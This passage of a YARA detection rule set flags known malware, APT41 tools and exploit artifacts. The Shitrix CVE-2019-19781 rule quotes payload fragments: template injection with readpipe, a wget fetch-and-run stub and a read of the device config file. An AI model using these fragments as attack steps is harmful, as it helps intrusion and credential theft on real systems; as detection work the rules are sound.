      $ = "::FromBase64String('dXNpbm" ascii wide
      $ = "::FromBase64String('H4sIA" ascii wide
      $ = "::FromBase64String('Y21k" ascii wide
      $ = "::FromBase64String('Qzpc" ascii wide
      $ = "::FromBase64String('Yzpc" ascii wide
      $ = "::FromBase64String('IAB" ascii wide
   condition: 
      filesize < 5000KB and 1 of them
} 

rule EXPL_Shitrix_Exploit_Code_Jan20_1_RID331C : DEMO EXPLOIT T1105 T1136 {
   meta:
      description = "Detects payloads used in Shitrix exploitation CVE-2019-19781"
      author = "Florian Roth"
      reference = "https://isc.sans.edu/forums/diary/Citrix+ADC+Exploits+Overview+of+Observed+Payloads/25704/"
      date = "2020-01-13 14:33:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      type = "file"
      tags = "DEMO, EXPLOIT, T1105, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s01 = "/netscaler/portal/scripts/rmpm.pl" ascii
      $s02 = "tee /netscaler/portal/templates/" ascii
      $s03 = "exec(\\'(wget -q -O- http://" ascii
      $s04 = "cd /netscaler/portal; ls" ascii
      $s05 = "cat /flash/nsconfig/ns.conf" ascii
      $s06 = "/netscaler/portal/scripts/PersonalBookmak.pl" ascii
      $s07 = "template.new({'BLOCK'='print readpipe(" ascii
      $s08 = "pwnpzi1337" fullword ascii
      $s09 = "template.new({'BLOCK'=" 
      $s10 = "template.new({'BLOCK'%3d" 
      $s11 = "my ($citrixmd, %FORM);" 
      $s12 = "(CMD, \"($citrixmd) 2>&1" 
      $b1 = "NSC_USER:" ascii nocase
      $b2 = "NSC_NONCE:" ascii nocase
      $b3 = "/../" ascii
   condition: 
      1 of ( $s* ) or all of ( $b* )
} 

rule MAL_ME_RawDisk_Agent_Jan20_2_RID30A9 : DEMO EXE FILE MAL MIDDLE_EAST T1136 {
   meta:
      description = "Detects suspicious malware using ElRawDisk"
      author = "Florian Roth"
      reference = "https://twitter.com/jfslowik/status/1212501454549741568?s=09"
      date = "2020-01-02 12:49:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, MIDDLE_EAST, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\Release\\Dustman.pdb" fullword ascii
      $x2 = "/c agent.exe A" fullword ascii
      $s1 = "C:\\windows\\system32\\cmd.exe" fullword ascii
      $s2 = "The Magic Word!" fullword ascii
      $s3 = "Software\\Oracle\\VirtualBox" fullword wide
      $s4 = "\\assistant.sys" fullword wide
      $s5 = "Down With Bin Salman" fullword wide
      $sc1 = { 00 5C 00 5C 00 2E 00 5C 00 25 00 73 } 
      $op1 = { 49 81 c6 ff ff ff 7f 4c 89 b4 24 98 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize <= 3000KB and ( 1 of ( $x* ) or 3 of them )
} 

rule MAL_ME_RawDisk_Agent_Jan20_1_RID30A8 : DEMO EXE FILE MAL MIDDLE_EAST T1136 {
   meta:
      description = "Detects suspicious malware using ElRawDisk"
      author = "Florian Roth"
      reference = "Saudi National Cybersecurity Authority - Destructive Attack DUSTMAN"
      date = "2020-01-02 12:49:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, MIDDLE_EAST, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\drv\\agent.plain.pdb" fullword ascii
      $x2 = " ************** Down With Saudi Kingdom, Down With Bin Salman ************** " fullword ascii
      $s1 = ".?AVERDError@@" fullword ascii
      $s2 = "b4b615c28ccd059cf8ed1abf1c71fe03c0354522990af63adf3c911e2287a4b906d47d" fullword wide
      $s3 = "\\\\?\\ElRawDisk" fullword wide
      $s4 = "\\??\\c:" fullword wide
      $op1 = { e9 3d ff ff ff 33 c0 48 89 05 0d ff 00 00 48 8b } 
      $op2 = { 0f b6 0c 01 88 48 34 48 8b 8d a8 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize <= 2000KB and ( 1 of ( $x* ) or 4 of them )
} 

rule SUSP_VHD_Suspicious_Small_Size_RID3285 : DEMO FILE SUSP {
   meta:
      description = "Detects suspicious VHD files"
      author = "Florian Roth"
      reference = "https://twitter.com/MeltX0R/status/1208095892877774850"
      date = "2019-12-21 14:08:41"
      score = 50
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SUSP"
      minimum_yara = "1.7"
      
   strings:
      $hc1 = { 63 6F 6E 65 63 74 69 78 } 
   condition: 
      uint16 ( 0 ) == 0x6f63 and $hc1 at 0 and filesize <= 4000KB
} 

rule SUSP_RAR_NtdsDIT_RID2C79 : DEMO FILE SUSP T1136 {
   meta:
      description = "Detects suspicious RAR file that contains ntds.dit or SAM export"
      author = "Florian Roth"
      reference = "https://www.cybereason.com/blog/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers"
      date = "2019-12-16 09:50:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "ntds.dit0" ascii fullword
      $x2 = { 0? 53 41 4D 30 01 00 03 } 
      $x3 = { 0? 73 61 6D 30 01 00 03 } 
   condition: 
      uint32 ( 0 ) == 0x21726152 and 1 of them
} 

rule MAL_Mirai_Nov19_1_RID2CC8 : DEMO FILE MAL T1136 {
   meta:
      description = "Detects Mirai malware"
      author = "Florian Roth"
      reference = "https://twitter.com/bad_packets/status/1194049104533282816"
      date = "2019-11-13 10:03:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "SERVZUXO" fullword ascii
      $s2 = "-loldongs" fullword ascii
      $s3 = "/dev/null" fullword ascii
      $s4 = "/bin/busybox" fullword ascii
      $sc1 = { 47 72 6F 75 70 73 3A 09 30 } 
   condition: 
      uint16 ( 0 ) == 0x457f and filesize <= 100KB and 4 of them
} 

rule SUSP_Double_Base64_Encoded_Executable_RID34CC : DEMO SUSP T1132 T1136 {
   meta:
      description = "Detects an executable that has been encoded with base64 twice"
      author = "Florian Roth"
      reference = "https://twitter.com/TweeterCyber/status/1189073238803877889"
      date = "2019-10-29 15:45:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SUSP, T1132, T1136"
      minimum_yara = "1.7"
      
   strings:
      $ = "VFZwVEFRR" ascii wide
      $ = "RWcFRBUU" ascii wide
      $ = "UVnBUQVFF" ascii wide
      $ = "VFZvQUFBQ" ascii wide
      $ = "RWb0FBQU" ascii wide
      $ = "UVm9BQUFB" ascii wide
      $ = "VFZxQUFBR" ascii wide
      $ = "RWcUFBQU" ascii wide
      $ = "UVnFBQUFF" ascii wide
      $ = "VFZwUUFBS" ascii wide
      $ = "RWcFFBQU" ascii wide
      $ = "UVnBRQUFJ" ascii wide
      $ = "VFZxUUFBT" ascii wide
      $ = "RWcVFBQU" ascii wide
      $ = "UVnFRQUFN" ascii wide
   condition: 
      1 of them
} 

rule SUSP_XORed_Mozilla_RID2DB4 : DEMO SUSP T1136 {
   meta:
      description = "Detects suspicious XORed keyword - Mozilla/5.0"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2019-10-28 10:43:11"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SUSP, T1136"
      minimum_yara = "3.8.0"
      
   strings:
      $xo1 = "Mozilla/5.0" xor ascii wide
      $xof1 = "Mozilla/5.0" ascii wide
   condition: 
      $xo1 and not $xof1
} 

rule MAL_CRIME_CobaltGang_Malware_Oct19_1_RID3392 : DEMO EXE FILE G0080 MAL {
   meta:
      description = "Detects CobaltGang malware"
      author = "Florian Roth"
      reference = "https://twitter.com/vxsh4d0w/status/1187353649015611392"
      date = "2019-10-24 14:53:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0080, MAL"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $op_a1 = { 0f 44 c2 eb 0a 31 c0 80 fa 20 0f 94 c0 01 c0 5d } 
      $op_b1 = { 89 e5 53 8b 55 08 8b 4d 0c 8a 1c 01 88 1c 02 83 } 
      $op_b2 = { 89 e5 53 8b 55 08 8b 45 0c 8a 1c 0a 88 1c 08 83 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize <= 2000KB and ( pe.imphash ( ) == "d1e3f8d02cce09520379e5c1e72f862f" or pe.imphash ( ) == "8e26df99c70f79cb8b1ea2ef6f8e52ac" or ( $op_a1 and 1 of ( $op_b* ) ) )
} 

rule SUSP_TINY_PE_RID2AF3 : DEMO EXE FILE SUSP {
   meta:
      description = "Detects Tiny PE file"
      author = "Florian Roth"
      reference = "https://webserver2.tecgraf.puc-rio.br/~ismael/Cursos/YC++/apostilas/win32_xcoff_pe/tyne-example/Tiny%20PE.htm"
      date = "2019-10-23 09:36:41"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, SUSP"
      minimum_yara = "1.7"
      
   strings:
      $header = { 4D 5A 00 00 50 45 00 00 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and uint16 ( 4 ) == 0x4550 and filesize <= 20KB and $header at 0
} 

rule SUSP_WER_Critical_HeapCorruption_RID3345 : DEMO FILE SUSP T1136 {
   meta:
      description = "Detects a crashed application that crashed due to a heap corruption error (could be a sign of exploitation)"
      author = "Florian Roth"
      reference = "https://twitter.com/cyb3rops/status/1185459425710092288"
      date = "2019-10-18 14:40:41"
      score = 45
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SUSP, T1136"
      minimum_yara = "3.2.0"
      
   strings:
      $a1 = "ReportIdentifier=" wide
      $a2 = ".Name=Fault Module Name" wide
      $s1 = "c0000374" wide
   condition: 
      ( uint32be ( 0 ) == 0x56006500 or uint32be ( 0 ) == 0xfffe5600 ) and all of them
} 

rule SUSP_PDB_Path_Keywords_RID2F34 : DEMO EXE FILE SUSP T1136 {
   meta:
      description = "Detects suspicious PDB paths"
      author = "Florian Roth"
      reference = "https://twitter.com/stvemillertime/status/1179832666285326337?s=20"
      date = "2019-10-04 11:47:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      nodeepdive = "1"
      tags = "DEMO, EXE, FILE, SUSP, T1136"
      minimum_yara = "1.7"
      
   strings:
      $ = "Debug\\Shellcode" ascii
      $ = "Release\\Shellcode" ascii
      $ = "Debug\\ShellCode" ascii
      $ = "Release\\ShellCode" ascii
      $ = "Debug\\shellcode" ascii
      $ = "Release\\shellcode" ascii
      $ = "shellcode.pdb" nocase ascii
      $ = "\\ShellcodeLauncher" ascii
      $ = "\\ShellCodeLauncher" ascii
      $ = "Fucker.pdb" ascii
      $ = "\\AVFucker\\" ascii
      $ = "ratTest.pdb" ascii
      $ = "Debug\\CVE_" ascii
      $ = "Release\\CVE_" ascii
      $ = "Debug\\cve_" ascii
      $ = "Release\\cve_" ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and 1 of them
} 

rule MAL_Emotet_JS_Dropper_Oct19_1_RID316E : DEMO FILE MAL {
   meta:
      description = "Detects Emotet JS dropper"
      author = "Florian Roth"
      reference = "https://app.any.run/tasks/aaa75105-dc85-48ca-9732-085b2ceeb6eb/"
      date = "2019-10-03 13:22:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, MAL"
      minimum_yara = "1.7"
      
   strings:
      $xc1 = { FF FE 76 00 61 00 72 00 20 00 61 00 3D 00 5B 00
               27 00 } 
   condition: 
      uint32 ( 0 ) == 0x0076feff and filesize <= 700KB and $xc1 at 0
} 

rule MAL_Trickbot_Malware_Oct19_2_RID3134 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Trickbot malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2019-10-02 13:12:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "C:\\Users\\User\\Desktop\\Encrypt\\Math_Cad\\Release\\Math_Cad.pdb" fullword ascii
      $x2 = "AxedWV3OVTFfnGb" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize <= 2000KB and 1 of them
} 

rule MAL_Trickbot_Malware_Oct19_3_RID3135 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Trickbot malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2019-10-02 13:12:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = "Decrypt Shell Fail" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize <= 2000KB and ( 1 of them or pe.imphash ( ) == "4e3fbfbf1fc23f646cd40a6fe09385a7" )
} 

rule MAL_Trickbot_Malware_Oct19_5_RID3137 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Trickbot malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2019-10-02 13:13:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "LoadShellCode" fullword ascii
      $s2 = "pShellCode" fullword ascii
      $s3 = "InitShellCode" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize <= 2000KB and 2 of them
} 

rule MAL_Trickbot_Malware_Oct19_1_RID3133 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Trickbot malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2019-10-02 13:12:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Celestor@hotmail.com" fullword ascii
      $s2 = "\\txtPassword" fullword ascii
      $s14 = "Invalid Password, try again!" fullword wide
      $op1 = { 78 c4 40 00 ff ff ff ff b4 47 41 } 
      $op2 = { 9b 68 b2 34 46 00 eb 14 8d 55 e4 8d 45 e8 52 50 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize <= 2000KB and 3 of them
} 

rule MAL_Trickbot_Malware_Oct19_4_RID3136 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Trickbot malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2019-10-02 13:12:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "c:\\users\\user\\documents\\visual studio 2005\\projects\\adzxser\\release\\ADZXSER.pdb" fullword ascii
      $x2 = "http://root-hack.org" fullword ascii
      $x3 = "http://hax-studios.net" fullword ascii
      $x4 = "5OCFBBKCAZxWUE#$_SVRR[SQJ" fullword ascii
      $x5 = "G*\\AC:\\Users\\911\\Desktop\\cButtonBar\\cButtonBar\\ButtonBar.vbp" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize <= 2000KB and 1 of them
} 

rule MAL_Trickbot_Malware_Oct19_6_RID3138 : DEMO EXE FILE MAL T1060 T1136 {
   meta:
      description = "Detects Trickbot malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2019-10-02 13:13:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1060, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "D:\\MyProjects\\spreader\\Release\\ssExecutor_x86.pdb" fullword ascii
      $s1 = "%s\\appdata\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\%s" fullword ascii
      $s2 = "%s\\appdata\\roaming\\%s" fullword ascii
      $s3 = "WINDOWS\\SYSTEM32\\TASKS" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize <= 400KB and ( 1 of ( $x* ) or 3 of them )
} 

rule SUSP_Unsigned_OSPPSVC_RID2E85 : DEMO EXE FILE SUSP T1035 T1086 {
   meta:
      description = "Detects a suspicious unsigned office software protection platform service binary"
      author = "Florian Roth"
      reference = "https://www.welivesecurity.com/2019/09/24/no-summer-vacations-zebrocy/"
      date = "2019-09-26 11:18:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, SUSP, T1035, T1086"
      required_modules = "pe"
      minimum_yara = "3.0.0"
      
   strings:
      $sc1 = { 00 46 00 69 00 6C 00 65 00 44 00 65 00 73 00 63
               00 72 00 69 00 70 00 74 00 69 00 6F 00 6E 00 00
               00 00 00 4D 00 69 00 63 00 72 00 6F 00 73 00 6F
               00 66 00 74 00 20 00 4F 00 66 00 66 00 69 00 63
               00 65 00 20 00 53 00 6F 00 66 00 74 00 77 00 61
               00 72 00 65 00 20 00 50 00 72 00 6F 00 74 00 65
               00 63 00 74 00 69 00 6F 00 6E 00 20 00 50 00 6C
               00 61 00 74 00 66 00 6F 00 72 00 6D 00 20 00 53
               00 65 00 72 00 76 00 69 00 63 00 65 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 8000KB and $sc1 and pe.number_of_signatures < 1
} 

rule MAL_ArtraDownloader2_Aug19_1_RID30FB : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects ArtraDownloader malware"
      author = "Florian Roth"
      reference = "https://unit42.paloaltonetworks.com/multiple-artradownloader-variants-used-by-bitter-to-target-pakistan/"
      date = "2019-08-27 13:03:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $xc1 = { 47 45 54 20 25 73 20 48 54 54 50 2F 31 2E 30 00
               0D 0A 00 00 48 6F 73 74 3A 20 25 73 00 00 00 00
               3F 61 3D 00 26 62 3D 00 26 63 3D 00 26 64 3D 00
               26 65 3D 00 25 32 30 } 
      $xc2 = { 25 73 20 25 73 20 25 73 0D 0A 25 73 20 25 73 0D
               0A 25 73 25 73 0D 0A 25 73 25 73 0D 0A 25 73 20
               25 64 0D 0A 0D 0A 25 73 00 00 00 00 71 72 79 3D } 
      $xc3 = { 49 44 3D 25 73 00 00 00 3A 00 00 00 25 73 20 25
               73 20 25 73 0D 0A 25 73 20 25 73 0D 0A 25 73 25
               73 0D 0A 25 73 25 73 0D 0A 43 6F 6E 74 65 6E 74
               2D 6C 65 6E 67 74 68 25 73 20 25 64 } 
      $xc4 = { 25 73 20 25 73 20 25 73 0D 0A 25 73 20 25 73 0D
               0A 25 73 25 73 0D 0A 25 73 25 73 0D 0A 43 6F 6E
               74 65 6E 74 2D 6C 65 6E 67 74 68 3A 20 25 64 0D
               0A 0D 0A 25 73 } 
      $x1 = "Tpguxbsf]Njdsptpgu" ascii
      $x2 = ".gpsn.vsmfodpefe" ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 1 of them
} 

rule APT_APT41_POISONPLUG_3_RID2DA0 : APT DEMO EXE FILE G0096 T1085 T1136 {
   meta:
      description = "Detects APT41 malware POISONPLUG"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html"
      date = "2019-08-07 10:39:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0096, T1085, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Rundll32.exe \"%s\", DisPlay 64" fullword ascii
      $s2 = "tcpview.exe" fullword ascii
      $s3 = "nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS" fullword ascii
      $s4 = "AxEeulaVteSgeR" fullword ascii
      $s5 = "%04d-%02d-%02d_%02d-%02d-%02d.dmp" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 900KB and 3 of them
} 

rule APT_APT41_POISONPLUG_SHADOW_RID2F33 : APT DEMO EXE FILE G0096 {
   meta:
      description = "Detects APT41 malware POISONPLUG SHADOW"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html"
      date = "2019-08-07 11:47:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0096"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and pe.imphash ( ) == "c67de089f2009b21715744762fc484e8"
} 

rule APT_APT41_CRACKSHOT_RID2CA0 : APT DEMO EXE FILE G0096 T1136 {
   meta:
      description = "Detects APT41 malware CRACKSHOT"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html"
      date = "2019-08-07 09:57:11"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0096, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = ";procmon64.exe;netmon.exe;tcpview.exe;MiniSniffer.exe;smsniff.exe" ascii
      $s1 = "RunUrlBinInMem" fullword ascii
      $s2 = "DownRunUrlFile" fullword ascii
      $s3 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36" fullword ascii
      $s4 = "%s|%s|%s|%s|%s|%s|%s|%dx%d|%04x|%08X|%s|%s" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 250KB and ( 1 of ( $x* ) or 2 of them )
} 

rule APT_APT41_POISONPLUG_2_RID2D9F : APT DEMO EXE FILE G0096 T1136 {
   meta:
      description = "Detects APT41 malware POISONPLUG"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html"
      date = "2019-08-07 10:39:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0096, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "ma_lockdown_service.dll" fullword wide
      $s2 = "acbde.dll" fullword ascii
      $s3 = "MA lockdown Service" fullword wide
      $s4 = "McAfee Agent" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 11000KB and all of them
} 

rule APT_APT41_POISONPLUG_RID2D0E : APT DEMO EXE FILE G0096 T1136 {
   meta:
      description = "Detects APT41 malware POISONPLUG"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html"
      date = "2019-08-07 10:15:31"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0096, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = "TSMSISrv.DLL" fullword wide
      $s2 = "[-]write failed[%d]" fullword ascii
      $s3 = "[-]load failed" fullword ascii
      $s4 = "Remote Desktop Services" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 10000KB and ( pe.imphash ( ) == "1b074ef7a1c0888ef31337c8ad2f2e0a" or 2 of them )
} 

rule APT_APT41_HIGHNOON_RID2C58 : APT DEMO EXE FILE G0096 T1136 {
   meta:
      description = "Detects APT41 malware HIGHNOON"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html"
      date = "2019-08-07 09:45:11"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0096, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "workdll64.dll" fullword ascii
      $s1 = "\\Fonts\\Error.log" fullword ascii
      $s2 = "[%d/%d/%d/%d:%d:%d]" fullword ascii
      $s3 = "work_end" fullword ascii
      $s4 = "work_start" fullword ascii
      $s5 = "\\svchost.exe" fullword ascii
      $s6 = "LoadAppInit_DLLs" fullword ascii
      $s7 = "netsvcs" fullword ascii
      $s8 = "HookAPIs ...PID %d " fullword ascii
      $s9 = "SOFTWARE\\Microsoft\\HTMLHelp" fullword ascii
      $s0 = "DllMain_mem" fullword ascii
      $s10 = "%s\\NtKlRes.dat" fullword ascii
      $s11 = "Global\\%s-%d" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( 1 of ( $x* ) or 4 of them )
} 

rule APT_APT41_HIGHNOON_2_RID2CE9 : APT DEMO EXE FILE G0096 T1136 {
   meta:
      description = "Detects APT41 malware HIGHNOON"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html"
      date = "2019-08-07 10:09:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0096, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "H:\\RBDoor\\" ascii
      $s1 = "PlusDll.dll" fullword ascii
      $s2 = "ShutDownEvent.dll" fullword ascii
      $s3 = "\\svchost.exe" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( pe.imphash ( ) == "b70358b00dd0138566ac940d0da26a03" or pe.exports ( "DllMain_mem" ) or $x1 or 3 of them )
} 

rule APT_APT41_HIGHNOON_BIN_RID2D90 : APT DEMO EXE FILE G0096 T1136 {
   meta:
      description = "Detects APT41 malware HIGHNOON.BIN"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html"
      date = "2019-08-07 10:37:11"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0096, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = "PlusDll.dll" fullword ascii
      $s2 = "\\Device\\PORTLESS_DeviceName" fullword wide
      $s3 = "%s%s\\Security" fullword ascii
      $s4 = "%s\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" fullword ascii
      $s5 = "%s%s\\Enum" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( pe.imphash ( ) == "b70358b00dd0138566ac940d0da26a03" or 3 of them )
} 

rule APT_APT41_HIGHNOON_BIN_2_RID2E21 : APT DEMO EXE FILE G0096 T1136 {
   meta:
      description = "Detects APT41 malware HIGHNOON.BIN"
      author = "Florian Roth"
      reference = "https://www.fireeye.com/blog/threat-research/2019/08/apt41-dual-espionage-and-cyber-crime-operation.html"
      date = "2019-08-07 11:01:21"
      score = 85
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, G0096, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\Double\\Door_wh\\" ascii
      $x2 = "[Stone] Config --> 2k3 TCP Positive Logout." fullword ascii
      $x3 = "\\RbDoorX64.pdb" ascii
      $x4 = "RbDoor, Version 1.0" fullword wide
      $x5 = "About RbDoor" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them
} 

rule SUSP_Unsigned_GoogleUpdate_RID3117 : DEMO EXE FILE SUSP {
   meta:
      description = "Detects suspicious unsigned GoogleUpdate.exe"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2019-08-05 13:07:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, SUSP"
      required_modules = "pe"
      minimum_yara = "3.0.0"
      
   strings:
      $ac1 = { 00 4F 00 72 00 69 00 67 00 69 00 6E 00 61 00 6C
               00 46 00 69 00 6C 00 65 00 6E 00 61 00 6D 00 65
               00 00 00 47 00 6F 00 6F 00 67 00 6C 00 65 00 55
               00 70 00 64 00 61 00 74 00 65 00 2E 00 65 00 78
               00 65 } 
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and $ac1 and pe.number_of_signatures < 1
} 

rule SUSP_PowerShell_Caret_Obfuscation_2_RID347B : DEMO OBFUS SCRIPT SUSP T1027 T1086 {
   meta:
      description = "Detects powershell keyword obfuscated with carets"
      author = "Florian Roth"
      reference = "Internal Research"
